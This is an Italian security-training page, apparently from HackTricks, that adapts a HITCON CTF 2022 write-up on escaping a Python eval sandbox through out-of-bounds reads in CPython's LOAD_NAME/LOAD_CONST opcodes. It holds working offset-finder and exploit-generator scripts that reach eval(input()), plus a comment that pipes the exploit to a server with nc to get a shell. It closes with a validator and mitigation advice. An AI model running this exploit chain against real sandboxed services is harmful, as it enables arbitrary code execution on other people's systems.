# LOAD_NAME / LOAD_CONST opcode OOB Read

{{#include ../../../banners/hacktricks-training.md}}

**Queste informazioni sono state prese** [**da questo writeup**](https://blog.splitline.tw/hitcon-ctf-2022/)**.**

### TL;DR <a href="#tldr-2" id="tldr-2"></a>

Possiamo utilizzare la funzionalità OOB read nell'opcode LOAD_NAME / LOAD_CONST per ottenere alcuni simboli nella memoria. Ciò significa utilizzare trucchi come `(a, b, c, ... centinaia di simboli ..., __getattribute__) if [] else [].__getattribute__(...)` per ottenere un simbolo (come il nome di una funzione) che desideri.

Poi basta creare il tuo exploit.

### Overview <a href="#overview-1" id="overview-1"></a>

Il codice sorgente è piuttosto breve, contiene solo 4 righe!
```python
source = input('>>> ')
if len(source) > 13337: exit(print(f"{'L':O<13337}NG"))
code = compile(source, '∅', 'eval').replace(co_consts=(), co_names=())
print(eval(code, {'__builtins__': {}}))1234
```
Puoi inserire codice Python arbitrario, e verrà compilato in un [oggetto codice Python](https://docs.python.org/3/c-api/code.html). Tuttavia, `co_consts` e `co_names` di quell'oggetto codice verranno sostituiti con una tupla vuota prima di valutare quell'oggetto codice.

In questo modo, tutte le espressioni che contengono costanti (ad es. numeri, stringhe, ecc.) o nomi (ad es. variabili, funzioni) potrebbero causare un errore di segmentazione alla fine.

### Lettura Fuori Limite <a href="#out-of-bound-read" id="out-of-bound-read"></a>

Come avviene l'errore di segmentazione?

Iniziamo con un semplice esempio, `[a, b, c]` potrebbe essere compilato nel seguente bytecode.
```
1           0 LOAD_NAME                0 (a)
2 LOAD_NAME                1 (b)
4 LOAD_NAME                2 (c)
6 BUILD_LIST               3
8 RETURN_VALUE12345
```
Ma cosa succede se il `co_names` diventa una tupla vuota? L'opcode `LOAD_NAME 2` viene comunque eseguito e cerca di leggere il valore da quell'indirizzo di memoria da cui dovrebbe originariamente provenire. Sì, questa è una "caratteristica" di lettura fuori limite.

Il concetto fondamentale per la soluzione è semplice. Alcuni opcodes in CPython, ad esempio `LOAD_NAME` e `LOAD_CONST`, sono vulnerabili (?) a letture OOB.

Essi recuperano un oggetto dall'indice `oparg` dalla tupla `consts` o `names` (questo è ciò che `co_consts` e `co_names` sono chiamati dietro le quinte). Possiamo fare riferimento al seguente breve frammento su `LOAD_CONST` per vedere cosa fa CPython quando elabora l'opcode `LOAD_CONST`.
```c
case TARGET(LOAD_CONST): {
PREDICTED(LOAD_CONST);
PyObject *value = GETITEM(consts, oparg);
Py_INCREF(value);
PUSH(value);
FAST_DISPATCH();
}1234567
```
In questo modo possiamo utilizzare la funzione OOB per ottenere un "nome" da un offset di memoria arbitrario. Per assicurarci di quale nome si tratta e qual è il suo offset, continua a provare `LOAD_NAME 0`, `LOAD_NAME 1` ... `LOAD_NAME 99` ... E potresti trovare qualcosa in circa oparg > 700. Puoi anche provare a usare gdb per dare un'occhiata alla disposizione della memoria, ma non credo che sarebbe più facile?

### Generating the Exploit <a href="#generating-the-exploit" id="generating-the-exploit"></a>

Una volta recuperati quegli offset utili per nomi / consts, come _facciamo_ a ottenere un nome / const da quell'offset e usarlo? Ecco un trucco per te:\
Supponiamo di poter ottenere un nome `__getattribute__` dall'offset 5 (`LOAD_NAME 5`) con `co_names=()`, quindi fai semplicemente le seguenti cose:
```python
[a,b,c,d,e,__getattribute__] if [] else [
[].__getattribute__
# you can get the __getattribute__ method of list object now!
]1234
```
> Nota che non è necessario chiamarlo `__getattribute__`, puoi chiamarlo con un nome più corto o più strano

Puoi capire il motivo semplicemente visualizzando il suo bytecode:
```python
0 BUILD_LIST               0
2 POP_JUMP_IF_FALSE       20
>>    4 LOAD_NAME                0 (a)
>>    6 LOAD_NAME                1 (b)
>>    8 LOAD_NAME                2 (c)
>>   10 LOAD_NAME                3 (d)
>>   12 LOAD_NAME                4 (e)
>>   14 LOAD_NAME                5 (__getattribute__)
16 BUILD_LIST               6
18 RETURN_VALUE
20 BUILD_LIST               0
>>   22 LOAD_ATTR                5 (__getattribute__)
24 BUILD_LIST               1
26 RETURN_VALUE1234567891011121314
```
Nota che `LOAD_ATTR` recupera anche il nome da `co_names`. Python carica i nomi dallo stesso offset se il nome è lo stesso, quindi il secondo `__getattribute__` è ancora caricato da offset=5. Utilizzando questa funzionalità possiamo usare un nome arbitrario una volta che il nome è in memoria nelle vicinanze.

Per generare numeri dovrebbe essere banale:

- 0: not \[\[]]
- 1: not \[]
- 2: (not \[]) + (not \[])
- ...

### Exploit Script <a href="#exploit-script-1" id="exploit-script-1"></a>

Non ho usato consts a causa del limite di lunghezza.

Prima ecco uno script per trovare quegli offset dei nomi.
```python
from types import CodeType
from opcode import opmap
from sys import argv


class MockBuiltins(dict):
def __getitem__(self, k):
if type(k) == str:
return k


if __name__ == '__main__':
n = int(argv[1])

code = [
*([opmap['EXTENDED_ARG'], n // 256]
if n // 256 != 0 else []),
opmap['LOAD_NAME'], n % 256,
opmap['RETURN_VALUE'], 0
]

c = CodeType(
0, 0, 0, 0, 0, 0,
bytes(code),
(), (), (), '<sandbox>', '<eval>', 0, b'', ()
)

ret = eval(c, {'__builtins__': MockBuiltins()})
if ret:
print(f'{n}: {ret}')

# for i in $(seq 0 10000); do python find.py $i ; done1234567891011121314151617181920212223242526272829303132
```
E il seguente è per generare il vero exploit Python.
```python
import sys
import unicodedata


class Generator:
# get numner
def __call__(self, num):
if num == 0:
return '(not[[]])'
return '(' + ('(not[])+' * num)[:-1] + ')'

# get string
def __getattribute__(self, name):
try:
offset = None.__dir__().index(name)
return f'keys[{self(offset)}]'
except ValueError:
offset = None.__class__.__dir__(None.__class__).index(name)
return f'keys2[{self(offset)}]'


_ = Generator()

names = []
chr_code = 0
for x in range(4700):
while True:
chr_code += 1
char = unicodedata.normalize('NFKC', chr(chr_code))
if char.isidentifier() and char not in names:
names.append(char)
break

offsets = {
"__delitem__": 2800,
"__getattribute__": 2850,
'__dir__': 4693,
'__repr__': 2128,
}

variables = ('keys', 'keys2', 'None_', 'NoneType',
'm_repr', 'globals', 'builtins',)

for name, offset in offsets.items():
names[offset] = name

for i, var in enumerate(variables):
assert var not in offsets
names[792 + i] = var


source = f'''[
({",".join(names)}) if [] else [],
None_ := [[]].__delitem__({_(0)}),
keys := None_.__dir__(),
NoneType := None_.__getattribute__({_.__class__}),
keys2 := NoneType.__dir__(NoneType),
get := NoneType.__getattribute__,
m_repr := get(
get(get([],{_.__class__}),{_.__base__}),
{_.__subclasses__}
)()[-{_(2)}].__repr__,
globals := get(m_repr, m_repr.__dir__()[{_(6)}]),
builtins := globals[[*globals][{_(7)}]],
builtins[[*builtins][{_(19)}]](
builtins[[*builtins][{_(28)}]](), builtins
)
]'''.strip().replace('\n', '').replace(' ', '')

print(f"{len(source) = }", file=sys.stderr)
print(source)

# (python exp.py; echo '__import__("os").system("sh")'; cat -) | nc challenge.server port
12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273
```
Fa fondamentalmente le seguenti cose, per quelle stringhe le otteniamo dal metodo `__dir__`:
```python
getattr = (None).__getattribute__('__class__').__getattribute__
builtins = getattr(
getattr(
getattr(
[].__getattribute__('__class__'),
'__base__'),
'__subclasses__'
)()[-2],
'__repr__').__getattribute__('__globals__')['builtins']
builtins['eval'](builtins['input']())
```
---

### Note sulla versione e opcodes interessati (Python 3.11–3.13)

- Gli opcodes del bytecode CPython indicizzano ancora le tuple `co_consts` e `co_names` tramite operandi interi. Se un attaccante riesce a forzare queste tuple a essere vuote (o più piccole dell'indice massimo utilizzato dal bytecode), l'interprete leggerà la memoria fuori dai limiti per quell'indice, restituendo un puntatore PyObject arbitrario dalla memoria vicina. Gli opcodes rilevanti includono almeno:
- `LOAD_CONST consti` → legge `co_consts[consti]`.
- `LOAD_NAME namei`, `STORE_NAME`, `DELETE_NAME`, `LOAD_GLOBAL`, `STORE_GLOBAL`, `IMPORT_NAME`, `IMPORT_FROM`, `LOAD_ATTR`, `STORE_ATTR` → leggono nomi da `co_names[...]` (per 3.11+ nota che `LOAD_ATTR`/`LOAD_GLOBAL` memorizzano i bit di flag nel bit basso; l'indice effettivo è `namei >> 1`). Vedi la documentazione del disassemblatore per la semantica esatta per versione. [Python dis docs].
- Python 3.11+ ha introdotto cache adattive/in-line che aggiungono voci `CACHE` nascoste tra le istruzioni. Questo non cambia il primitivo OOB; significa solo che se crei manualmente bytecode, devi tenere conto di quelle voci di cache quando costruisci `co_code`.

Implicazione pratica: la tecnica in questa pagina continua a funzionare su CPython 3.11, 3.12 e 3.13 quando puoi controllare un oggetto di codice (ad esempio, tramite `CodeType.replace(...)`) e ridurre `co_consts`/`co_names`.

### Scanner rapido per indici OOB utili (compatibile 3.11+/3.12+)

Se preferisci sondare oggetti interessanti direttamente dal bytecode piuttosto che da sorgente di alto livello, puoi generare oggetti di codice minimi e forzare gli indici. L'aiutante qui sotto inserisce automaticamente cache in-line quando necessario.
```python
import dis, types

def assemble(ops):
# ops: list of (opname, arg) pairs
cache = bytes([dis.opmap.get("CACHE", 0), 0])
out = bytearray()
for op, arg in ops:
opc = dis.opmap[op]
out += bytes([opc, arg])
# Python >=3.11 inserts per-opcode inline cache entries
ncache = getattr(dis, "_inline_cache_entries", {}).get(opc, 0)
out += cache * ncache
return bytes(out)

# Reuse an existing function's code layout to simplify CodeType construction
base = (lambda: None).__code__

# Example: probe co_consts[i] with LOAD_CONST i and return it
# co_consts/co_names are intentionally empty so LOAD_* goes OOB

def probe_const(i):
code = assemble([
("RESUME", 0),          # 3.11+
("LOAD_CONST", i),
("RETURN_VALUE", 0),
])
c = base.replace(co_code=code, co_consts=(), co_names=())
try:
return eval(c)
except Exception:
return None

for idx in range(0, 300):
obj = probe_const(idx)
if obj is not None:
print(idx, type(obj), repr(obj)[:80])
```
Note
- Per sondare i nomi invece, sostituisci `LOAD_CONST` con `LOAD_NAME`/`LOAD_GLOBAL`/`LOAD_ATTR` e regola di conseguenza l'uso dello stack.
- Usa `EXTENDED_ARG` o più byte di `arg` per raggiungere indici >255 se necessario. Quando costruisci con `dis` come sopra, controlli solo il byte basso; per indici più grandi, costruisci i byte grezzi tu stesso o dividi l'attacco su più caricamenti.

### Modello RCE minimale solo bytecode (co_consts OOB → builtins → eval/input)

Una volta identificato un indice `co_consts` che si risolve nel modulo builtins, puoi ricostruire `eval(input())` senza alcun `co_names` manipolando lo stack:
```python
# Build co_code that:
# 1) LOAD_CONST <builtins_idx> → push builtins module
# 2) Use stack shuffles and BUILD_TUPLE/UNPACK_EX to peel strings like 'input'/'eval'
#    out of objects living nearby in memory (e.g., from method tables),
# 3) BINARY_SUBSCR to do builtins["input"] / builtins["eval"], CALL each, and RETURN_VALUE
# This pattern is the same idea as the high-level exploit above, but expressed in raw bytecode.
```
Questo approccio è utile in sfide che ti danno il controllo diretto su `co_code` mentre forzano `co_consts=()` e `co_names=()` (ad esempio, BCTF 2024 “awpcode”). Evita trucchi a livello di sorgente e mantiene le dimensioni del payload ridotte sfruttando le operazioni sulla stack di bytecode e i costruttori di tuple.

### Controlli difensivi e mitigazioni per sandbox

Se stai scrivendo una “sandbox” Python che compila/evalua codice non affidabile o manipola oggetti di codice, non fare affidamento su CPython per controllare i limiti degli indici delle tuple utilizzati dal bytecode. Invece, valida gli oggetti di codice tu stesso prima di eseguirli.

Validator pratico (rifiuta l'accesso OOB a co_consts/co_names)
```python
import dis

def max_name_index(code):
max_idx = -1
for ins in dis.get_instructions(code):
if ins.opname in {"LOAD_NAME","STORE_NAME","DELETE_NAME","IMPORT_NAME",
"IMPORT_FROM","STORE_ATTR","LOAD_ATTR","LOAD_GLOBAL","DELETE_GLOBAL"}:
namei = ins.arg or 0
# 3.11+: LOAD_ATTR/LOAD_GLOBAL encode flags in the low bit
if ins.opname in {"LOAD_ATTR","LOAD_GLOBAL"}:
namei >>= 1
max_idx = max(max_idx, namei)
return max_idx

def max_const_index(code):
return max([ins.arg for ins in dis.get_instructions(code)
if ins.opname == "LOAD_CONST"] + [-1])

def validate_code_object(code: type((lambda:0).__code__)):
if max_const_index(code) >= len(code.co_consts):
raise ValueError("Bytecode refers to const index beyond co_consts length")
if max_name_index(code) >= len(code.co_names):
raise ValueError("Bytecode refers to name index beyond co_names length")

# Example use in a sandbox:
# src = input(); c = compile(src, '<sandbox>', 'exec')
# c = c.replace(co_consts=(), co_names=())       # if you really need this, validate first
# validate_code_object(c)
# eval(c, {'__builtins__': {}})
```
Idee aggiuntive di mitigazione
- Non consentire `CodeType.replace(...)` arbitrario su input non attendibili, o aggiungere controlli strutturali rigorosi sull'oggetto codice risultante.
- Considerare di eseguire codice non attendibile in un processo separato con sandboxing a livello di OS (seccomp, job objects, containers) invece di fare affidamento sulla semantica di CPython.

## Riferimenti

- Il writeup di Splitline per HITCON CTF 2022 “V O I D” (origine di questa tecnica e catena di exploit ad alto livello): https://blog.splitline.tw/hitcon-ctf-2022/
- Documentazione del disassemblatore Python (semantica degli indici per LOAD_CONST/LOAD_NAME/etc., e flag a basso bit per `LOAD_ATTR`/`LOAD_GLOBAL` in 3.11+): https://docs.python.org/3.13/library/dis.html
{{#include ../../../banners/hacktricks-training.md}}
